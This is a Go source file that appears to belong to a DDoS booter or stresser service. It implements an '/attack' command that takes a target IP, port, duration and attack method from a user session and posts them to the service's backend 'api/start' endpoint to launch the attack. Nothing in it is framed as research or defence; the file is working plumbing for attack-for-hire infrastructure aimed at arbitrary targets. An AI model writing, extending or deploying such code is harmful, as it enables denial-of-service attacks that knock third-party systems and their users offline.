package commands

import (
	"api/core/net/sessions"
	"api/core/models"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/cookiejar"
	"net/url"
)
var (
    GlobalIP        string
    GlobalPort      string
    GlobalTime      string
    GlobalMethod    string
)
type Attack struct {
	IP       string
	Port     int
	Time     int
	Method   string
	MethodID int
}

func attack(session *sessions.Session, args []string) {
	if len(args) < 5 {
		fmt.Fprintf(session.Conn, "Insufficient arguments. Usage: /attack ip port time method\n\r")
		return
	}

	if session == nil || session.Cookie() == nil {
        fmt.Fprintf(session.Conn, "Invalid session or session cookie\n\r")
        return
    }
	// Extract command-line arguments
	type response struct {
		Status  string `json:"status"`
		Message string `json:"message"`
	}
	var r *response
	ip := args[1]
	portStr := args[2]
	timeStr := args[3]
	method := args[4]

    GlobalIP = ip
    GlobalPort = portStr
    GlobalTime = timeStr
    GlobalMethod = method
	values := url.Values{
		"host":     []string{ip},
		"method":   []string{method},
		"duration": []string{timeStr},
		"port":     []string{portStr},
	}
	jar, err := cookiejar.New(nil)
	if err != nil {
		return
	}
	url, _ := url.Parse(models.Config.Domain + "api/start")
	jar.SetCookies(url, []*http.Cookie{session.Cookie()})
	c := &http.Client{
		Jar: jar,
	}
	resp, err := c.PostForm(models.Config.Domain + "api/start", values)
	if err != nil {
		return
	}
	json.NewDecoder(resp.Body).Decode(&r)
	switch r.Status {
	case "error":
		fmt.Fprintf(session.Conn, r.Message+"\r\n")
	case "success":
		fmt.Fprintf(session.Conn, r.Message+"\r\n")
        Commands["splash-attack"].Exec(session, nil)
	}
}
